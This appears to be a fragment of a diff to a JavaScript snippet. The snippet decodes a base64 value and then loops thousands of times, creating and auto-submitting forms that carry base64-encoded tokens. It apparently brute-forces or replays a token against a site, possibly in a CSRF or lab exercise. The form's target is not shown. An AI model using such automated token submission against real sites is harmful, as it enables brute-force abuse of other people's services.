@@ -8,8 +8,8 @@
 let last = "MzU4Ng=="; 
 let base = parseInt(atob(last));
 
-for (let i = 1; i <= 9999; i++) {
-    let number = 9999;
+for (let i = 1; i <= 5000; i++) {
+    let number = 6000;
     let new_token = btoa(number.toString());
     
     let f = document.createElement('form');
@@ -42,7 +42,8 @@ for (let i = 1; i <= 9999; i++) {
     
     setTimeout(() => {
         f.submit();
-    }, i * 10); // delay between each submit
+        f.remove()
+    }, i * 50); // delay between each submit
 }
 </script>
 
